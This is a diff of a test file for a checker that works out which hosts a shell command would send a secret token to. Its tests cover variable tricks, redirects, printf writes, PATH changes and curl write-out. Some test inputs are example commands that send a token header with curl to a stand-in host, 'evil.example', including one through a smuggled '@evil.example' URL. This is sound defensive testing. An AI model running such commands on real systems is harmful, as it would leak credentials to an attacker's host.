@@ -125,7 +125,7 @@ describe("a command whose destination can be read", () => {
         });
         expect(hostsOf(`R=https://api.github.com && curl -H "x: ${TOKEN}" $R/user`)).toEqual({ certain: true, hosts: ["api.github.com"] });
         // The value is read, not trusted: a variable that holds another host names that host.
-        expect(hostsOf(`H=evil.example; curl -H "x: ${TOKEN}" https://$H/x`)).toMatchObject({ certain: false });
+        expect(hostsOf(`H=evil.example; curl -H "x: ${TOKEN}" https://$H/x`)).toEqual({ certain: true, hosts: ["evil.example"] });
         expect(hostsOf(`U=evil.example/x; curl -H "x: ${TOKEN}" $U`)).toEqual({ certain: true, hosts: ["evil.example"] });
         expect(hostsOf(`A=https://api.github.com; B="$A/user"; curl -H "x: ${TOKEN}" "$B"`)).toEqual({ certain: true, hosts: ["api.github.com"] });
         // The latest plain assignment is the one in force.
@@ -194,7 +194,9 @@ describe("a command whose destination cannot be read", () => {
             "it runs `R=https://api.github.com`, and where that sends things is not in the command's text",
         );
         // printf -v sets a variable; a changed IFS or a value with blanks or globs splits unquoted.
-        expect(whyOf(`R=https://api.github.com; printf -v R %s evil.example; curl -H "x: ${TOKEN}" $R`)).toBe(expands);
+        expect(whyOf(`R=https://api.github.com; printf -v R %s evil.example; curl -H "x: ${TOKEN}" $R`)).toBe(
+            "it changes shell variables, which can change what a later command does",
+        );
         expect(whyOf(`R=https://api.github.com; IFS=/; curl -H "x: ${TOKEN}" $R`)).toBe(expands);
         expect(whyOf(`R="https://api.github.com evil.example"; curl -H "x: ${TOKEN}" $R`)).toBe(expands);
         expect(whyOf(`R=https://api.github.com/*; curl -H "x: ${TOKEN}" $R`)).toBe(expands);
@@ -277,6 +279,158 @@ describe("a command whose destination cannot be read", () => {
     it("refuses an unclosed quote", () => {
         expect(whyOf(`curl -H "x: ${TOKEN} https://api.github.com`)).toBe("a quote in it never closes");
         expect(whyOf(`curl -H 'x: ${TOKEN} https://api.github.com`)).toBe("a quote in it never closes");
+    });
+});
+
+describe("shell words and utility arguments", () => {
+    // These shapes were checked against bash argv, real utility outputs/helpers in a temporary directory, and
+    // wget requests to a loopback redirect fixture. The reader must preserve those programs' argument boundaries.
+    it.each([
+        "cu\\\nrl https://api.github.com",
+        "curl https://api.\\\ngithub.com",
+        "curl https://api.github.com -s\\\nS",
+        'curl "https://api.\\\ngithub.com"',
+        "\\\ncurl https://api.github.com",
+        'R\\\n=https://api.github.com; curl "$R"',
+    ])("removes a continuation without ending or starting a word: %s", (command) => {
+        expect(hostsOf(command)).toEqual({ certain: true, hosts: ["api.github.com"] });
+    });
+
+    it.each(["--\\\nlocation", "--loca\\\ntion", '"--loca\\\ntion"', "-\\\nL"])("reads a continued redirect option: %s", (option) => {
+        expect(whyOf(`curl -H "x: ${TOKEN}" https://api.github.com ${option}`)).toBe("it follows redirects, which can lead to any host");
+    });
+
+    it("keeps backslashes that double quotes do not escape", () => {
+        expect(whyOf('curl "--\\location" https://api.github.com')).toBe("it uses an option (--\\location) this check does not read");
+        expect(whyOf('curl "https://api.github.com\\@evil.example"')).toBe('the host in "https://api.github.com\\@evil.example" cannot be read');
+        expect(hostsOf('curl -H "x: \\$TOKEN" https://api.github.com')).toEqual({ certain: true, hosts: ["api.github.com"] });
+    });
+
+    it("keeps a continuation inside single quotes literal and ignores URLs in comments", () => {
+        expect(whyOf("curl 'https://api.\\\ngithub.com'")).toBe('the host in "https://api.\\\ngithub.com" cannot be read');
+        expect(hostsOf("curl https://api.github.com # https://comment.example")).toEqual({ certain: true, hosts: ["api.github.com"] });
+    });
+
+    it("ends neither a numeric argument nor a redirect target early", () => {
+        expect(hostsOf("curl '123'>/dev/null")).toEqual({ certain: true, hosts: ["123"] });
+        expect(hostsOf("curl \\123>/dev/null")).toEqual({ certain: true, hosts: ["123"] });
+        expect(hostsOf('curl https://api.github.com 2>"/dev/null" 3>&1')).toEqual({ certain: true, hosts: ["api.github.com"] });
+        expect(hostsOf("curl https://api.github.com 2\\\n>/dev/null")).toEqual({ certain: true, hosts: ["api.github.com"] });
+    });
+
+    it.each([">/dev/null.extra", ">/dev/null-suffix", ">/dev/null''suffix", ">&1suffix", ">", ">&", "<<EOF"])(
+        "leaves an unsafe or incomplete redirect unread: %s",
+        (redirect) => {
+            expect(whyOf(`echo ${TOKEN} ${redirect}`)).toBe("it redirects input or output");
+        },
+    );
+
+    it("uses wget's last redirect limit", () => {
+        expect(whyOf(`wget --max-redirect=0 --max-redirect=1 --header "x: ${TOKEN}" https://api.github.com`)).toBe(
+            "it follows redirects, which can lead to any host",
+        );
+        expect(hostsOf(`wget --max-redirect=1 --max-redirect=0 --header "x: ${TOKEN}" https://api.github.com`)).toEqual({
+            certain: true,
+            hosts: ["api.github.com"],
+        });
+    });
+
+    it.each([
+        "rg --pre ./helper pattern input",
+        "rg --pre=./helper pattern input",
+        "rg --hostname-bin ./helper pattern input",
+        "rg --hostname-bin=./helper pattern input",
+        "rg -z pattern input",
+        "rg --search-zip pattern input",
+        "sort --compress-program=./helper input",
+        "sort --compress-program ./helper input",
+    ])("does not call a utility inert when it runs a helper: %s", (utility) => {
+        expect(whyOf(`${utility}; curl -H "x: ${TOKEN}" https://api.github.com`)).toBe("it runs another program");
+    });
+
+    it.each([
+        "sort -o output input",
+        "sort -ooutput input",
+        "sort -nrooutput input",
+        "sort --output output input",
+        "sort --output=output input",
+        "uniq input output",
+        "uniq - output",
+        "uniq -- input output",
+        "uniq -f 2 -s 1 input output",
+    ])("does not call a utility inert when it writes a file: %s", (utility) => {
+        expect(whyOf(`${utility}; curl -H "x: ${TOKEN}" https://api.github.com`)).toBe(
+            "it writes a file, which can change what a later command does",
+        );
+    });
+
+    it.each([
+        "rg login",
+        "rg --no-config -n -i -g '*.ts' pattern .",
+        "rg -A 2 -e pattern -- --pre",
+        "rg -- -z input",
+        "sort -nru -k 2 -t : input",
+        "sort -- --output",
+        "uniq",
+        "uniq -ci -f 2 input",
+        "uniq --skip-fields=2 --check-chars=10 input",
+        "uniq -- --output",
+        "printf '%s\\n' done",
+        "printf -- '%%n %s' value",
+        "printf '%s' '%n'",
+    ])("still reads ordinary utility arguments: %s", (utility) => {
+        expect(hostsOf(`curl -H "x: ${TOKEN}" https://api.github.com | ${utility}`)).toEqual({ certain: true, hosts: ["api.github.com"] });
+    });
+
+    it.each(["rg --future-option", "sort --future-option", "uniq --future-option"])("asks about an unknown utility option: %s", (utility) => {
+        expect(whyOf(`${utility}; curl -H "x: ${TOKEN}" https://api.github.com`)).toBe(
+            "it uses an option (--future-option) this check does not read",
+        );
+    });
+
+    it.each([
+        "printf -v PATH %s ./tools",
+        "printf -vPATH %s ./tools",
+        "printf '%n' PATH",
+        "printf '%10n' PATH",
+        "printf '%*n' 2 PATH",
+        "printf '%.*n' 2 PATH",
+        'printf "%\'n" PATH',
+    ])("reads printf's shell-variable writes: %s", (utility) => {
+        expect(whyOf(`${utility}; curl -H "x: ${TOKEN}" https://api.github.com`)).toBe(
+            "it changes shell variables, which can change what a later command does",
+        );
+    });
+
+    it("asks when a format is supplied at runtime or a binding changes program lookup", () => {
+        expect(whyOf(`printf "$FORMAT" ${TOKEN}`)).toBe("the printf format is filled in when it runs");
+        expect(whyOf(`printf ${TOKEN} PATH`)).toBe("the printf format is filled in when it runs");
+        expect(whyOf(`PATH=./tools; curl -H "x: ${TOKEN}" https://api.github.com`)).toBe("it changes PATH, which can change which program runs");
+        expect(whyOf(`rg "$OPTIONS" pattern input; curl -H "x: ${TOKEN}" https://api.github.com`)).toBe(
+            "a shell variable or expansion in it is only filled in when it runs",
+        );
+        expect(whyOf(`rg "${TOKEN}" pattern input; curl https://api.github.com`)).toBe(
+            "an option or argument is filled in by the secret when it runs",
+        );
+        expect(hostsOf(`rg -e "${TOKEN}" input; curl https://api.github.com`)).toEqual({ certain: true, hosts: ["api.github.com"] });
+        expect(hostsOf(`R=https://api.github.com; printf '%s' '-value'; curl "$R"`)).toEqual({ certain: true, hosts: ["api.github.com"] });
+    });
+
+    it.each(['-w "%output{output}text"', '--write-out "%output{output}text"', "--write-out @format", '-w "$FORMAT"'])(
+        "reads curl's write-out as a format that can write files: %s",
+        (option) => {
+            expect(whyOf(`curl ${option} -H "x: ${TOKEN}" https://api.github.com`)).toBe(
+                "it writes the request, secret included, somewhere a later command can read it",
+            );
+        },
+    );
+
+    it("still reads a curl write-out format with ordinary fields or a literal percent", () => {
+        expect(hostsOf(`curl -w '%{http_code} %%output{literal}' -H "x: ${TOKEN}" https://api.github.com`)).toEqual({
+            certain: true,
+            hosts: ["api.github.com"],
+        });
+        expect(hostsOf(`wget -w "$WAIT" --max-redirect=0 https://api.github.com`)).toEqual({ certain: true, hosts: ["api.github.com"] });
     });
 });
 
